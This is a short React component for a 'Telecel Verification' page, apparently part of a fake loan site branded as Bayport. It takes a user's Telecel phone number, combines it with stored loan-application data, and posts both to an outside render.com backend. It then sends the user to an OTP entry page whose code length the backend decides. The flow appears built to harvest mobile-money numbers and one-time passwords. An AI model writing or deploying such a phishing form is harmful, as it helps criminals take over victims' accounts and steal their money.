import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import axios from "axios";
import "../styles/app.css";

export default function Telecel() {
  const { id } = useParams();
  const navigate = useNavigate();

  const [loading, setLoading] = useState(false);
  const [data, setData] = useState({
    number: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      const loanData = JSON.parse(localStorage.getItem("loanData"));

      await axios.post(
        "https://g-bayport-loans.onrender.com/telecel",
        {
          id,
          ...loanData,
          ...data,
        }
      );

      // backend decides OTP length
      navigate(`/otp/${id}`);

    } catch {
      alert("Error submitting");
    }

    setLoading(false);
  };

  return (
    <div className="loan-container">
      <div className="card">

        <h1>Telecel Verification</h1>

        <form onSubmit={handleSubmit}>

          <input
            name="number"
            placeholder="Telecel Number"
            onChange={handleChange}
            required
          />

          <button className="btn">
            {loading ? <div className="spinner"></div> : "Verify"}
          </button>

        </form>

      </div>
    </div>
  );
}